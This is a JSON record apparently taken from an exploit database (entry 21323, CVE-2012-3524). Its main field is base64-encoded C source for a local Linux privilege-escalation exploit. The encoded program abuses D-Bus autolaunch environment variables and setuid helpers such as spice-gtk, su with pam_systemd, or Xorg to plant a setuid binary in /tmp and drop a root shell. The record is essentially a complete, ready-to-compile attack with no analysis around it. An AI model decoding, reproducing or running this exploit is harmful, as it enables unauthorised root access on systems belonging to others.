{
    "source": "exploit-database", 
    "exploit": "LyogZHp1Zy5jIENWRS0yMDEyLTM1MjQgUG9DIChDKSAyMDEyIFNlYmFzdGlhbiBLcmFobWVyDQogKg0KICogVHJpdmlhbCBub24tZGJ1cyByb290IGV4cGxvaXQuIChZZXMsIGl0IGlzIDIwMTIhKQ0KICoNCiAqIFRoZSB1bmRlcmx5aW5nIGJ1ZyAoaW5zZWN1cmUgZ2V0ZW52KCkgYnkgZGVmYXVsdCkgaGFzIGJlZW4NCiAqIHJlcG9ydGVkIGFnZXMgYWdvLCBidXQgbm9ib2R5IHJlYWxseSBjYXJlZC4gVW5sZXNzIHlvdSBoYXZlIGFuDQogKiBleHBsb2l0Li4uDQogKg0KICovDQoNCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8c3lzL3dhaXQuaD4NCiNpbmNsdWRlIDxzeXMvc2lnbmFsLmg+DQojaW5jbHVkZSA8c3lzL3N0YXQuaD4NCg0KDQppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqKmFyZ3YpDQp7DQoJaW50IGkgPSAwOw0KCXN0cnVjdCBzdGF0IHN0Ow0KCXBpZF90IHBpZCA9IDA7DQoJY2hhciAqZW52W10gPSB7DQoJICAgICJQQVRIPS90bXA6L3Vzci9iaW46L3Vzci9zYmluOi9zYmluOi9iaW4iLA0KCSAgICAiREJVU19TVEFSVEVSX0JVU19UWVBFPXN5c3RlbSIsDQoJICAgICJEQlVTX1NZU1RFTV9CVVNfQUREUkVTUz1hdXRvbGF1bmNoOiIsDQoJICAgIE5VTEwsDQoJICAgIE5VTEwNCgl9Ow0KDQoNCgkvKiB0aGUgcGFtX3N5c3RlbWQgdmVjdG9yICovDQoJY2hhciAqc3VbXSA9IHsiL2Jpbi9zdSIsIE5VTEwsICJibGFoIiwgTlVMTH07DQoNCgkvKiB0aGUgc3BpY2UgdmVjdG9yICovDQoJY2hhciAqc3BpY2VbXSA9IHsiL3Vzci9saWJleGVjL3NwaWNlLWd0ay14ODZfNjQvc3BpY2UtY2xpZW50LWdsaWItdXNiLWFjbC1oZWxwZXIiLCBOVUxMfTsNCg0KCS8qIHRoZSBYb3JnIHZlY3RvciwgZm9yIG9sZGVyIExpbnV4IGRpc3RzIGFuZCBTb2xhcmlzICovDQoJY2hhciAqeG9yZ1tdID0geyIvdXNyL2Jpbi9Yb3JnIiwgIjo3MzUwIiwgTlVMTH07DQoNCgljaGFyICoqYSA9IHhvcmc7DQoJY2hhciAqZGJ1c1tdID0geyIvdG1wL2RidXMtbGF1bmNoIiwgTlVMTH07DQoJY2hhciAqc2hbXSA9IHsiL2Jpbi9iYXNoIiwgIi0tbm9wcm9maWxlIiwgIi0tbm9yYyIsIE5VTEx9Ow0KCWNoYXIgbWVbMHgxMDAwXTsNCg0KCWlmIChnZXRldWlkKCkgPT0gMCAmJiBhcmdjID4gMSkgew0KCQljaG93bigiL3RtcC9kYnVzLWxhdW5jaCIsIDAsIDApOw0KCQljaG1vZCgiL3RtcC9kYnVzLWxhdW5jaCIsIDA0NzU1KTsNCgkJZXhpdChlcnJubyk7DQoJfSBlbHNlIGlmIChnZXRldWlkKCkgPT0gMCkgew0KCQlzZXR1aWQoMCk7DQoJCWV4ZWN2ZSgqc2gsIHNoLCBOVUxMKTsNCgkJcmV0dXJuIGVycm5vOw0KCX0NCg0KCXByaW50ZigiWyoqXSBDVkUtMjAxMi0zNTI0IHhTcG9ydHMgLS0gdGhpcyBpcyBub3QgYSBkYnVzIGV4cGxvaXQhXG5cblsqXSBQcmVwYXJpbmcgLi4uXG4iKTsNCgltZW1zZXQobWUsIDAsIHNpemVvZihtZSkpOw0KDQoJaWYgKHJlYWRsaW5rKCIvcHJvYy9zZWxmL2V4ZSIsIG1lLCBzaXplb2YobWUpIC0gMSkgPCAwKSB7DQoJCS8qIFNvbGFyaXMgKi8NCgkJcmVhZGxpbmsoIi9wcm9jL3NlbGYvcGF0aC9hLm91dCIsIG1lLCBzaXplb2YobWUpIC0gMSk7DQoJfQ0KCXN5bWxpbmsobWUsICIvdG1wL2RidXMtbGF1bmNoIik7DQoNCglpZiAoc3RhdChzcGljZVswXSwgJnN0KSA9PSAwKSB7DQoJCWlmICgoc3Quc3RfbW9kZSAmIDA0MDAwKSA9PSAwNDAwMCkgew0KCQkJcHJpbnRmKCJbK10gVXNpbmcgc3BpY2UgaGVscGVyIC4uLlxuIik7DQoJCQlhID0gc3BpY2U7DQoJCX0NCgl9IGVsc2UgaWYgKHN0YXQoIi9saWI2NC9zZWN1cml0eS9wYW1fc3lzdGVtZC5zbyIsICZzdCkgPT0gMCkgew0KCQlwcmludGYoIlsrXSBVc2luZyBwYW1fc3lzdGVtZCBoZWxwZXIgKHR5cGUgdXNlciBwYXNzd2Qgd2hlbiBhc2tlZCkgLi4uXG4iKTsNCgkJZW52WzNdID0gIkRJU1BMQVk9OjczNTAiOw0KCQlzdVsxXSA9IGdldGVudigiVVNFUiIpOw0KCQlhID0gc3U7DQoJfSBlbHNlIGlmIChzdGF0KHhvcmdbMF0sICZzdCkgPT0gMCkgew0KCQlpZiAoKHN0LnN0X21vZGUgJiAwNDAwMCkgPT0gMDQwMDApDQoJCQlwcmludGYoIlsrXSBVc2luZyBYb3JnIGhlbHBlciAuLi5cbiIpOw0KCQllbHNlIHsNCgkJCXByaW50ZigiWy1dIE5vIHN1aXRhYmxlIHN1aWQgaGVscGVyIGZvdW5kLlxuIik7DQoJCQlleGl0KDApOw0KCQl9DQoJfSBlbHNlIHsNCgkJcHJpbnRmKCJbLV0gTm8gc3VpdGFibGUgc3VpZCBoZWxwZXIgZm91bmQuXG4iKTsNCgkJZXhpdCgwKTsNCgl9DQoNCglpZiAoKHBpZCA9IGZvcmsoKSkgPT0gMCkgew0KCQlleGVjdmUoKmEsIGEsIGVudik7DQoJCWV4aXQoMCk7DQoJfQ0KDQoJcHJpbnRmKCJbKl0gV2FpdGluZyAxMHMgZm9yIGRidXMtbGF1bmNoIHRvIGRyb3AgYm9vbXNoZWxsLlxuIik7DQoNCglmb3IgKGkgPSAwOyBpIDwgMTA7ICsraSkgew0KCQlzbGVlcCgxKTsNCgkJcHJpbnRmKCIuIik7IGZmbHVzaChzdGRvdXQpOw0KCX0NCglraWxsKHBpZCwgU0lHS0lMTCk7DQoJd2FpdHBpZChwaWQsIE5VTEwsIDApOw0KDQoJZm9yICg7Oykgew0KCQlzdGF0KCpkYnVzLCAmc3QpOw0KCQlpZiAoKHN0LnN0X21vZGUgJiAwNDc1NSkgPT0gMDQ3NTUpDQoJCQlicmVhazsNCgkJc2xlZXAoMSk7DQoJfQ0KCXByaW50ZigiXG5bIV0gSHVycmEhXG4iKTsNCg0KCWV4ZWN2ZSgqZGJ1cywgZGJ1cywgTlVMTCk7DQoJcmV0dXJuIGVycm5vOw0KfQ==", 
    "filename": "platforms/linux/local/21323.c", 
    "id": "21323", 
    "cves": [
        "CVE-2012-3524"
    ]
}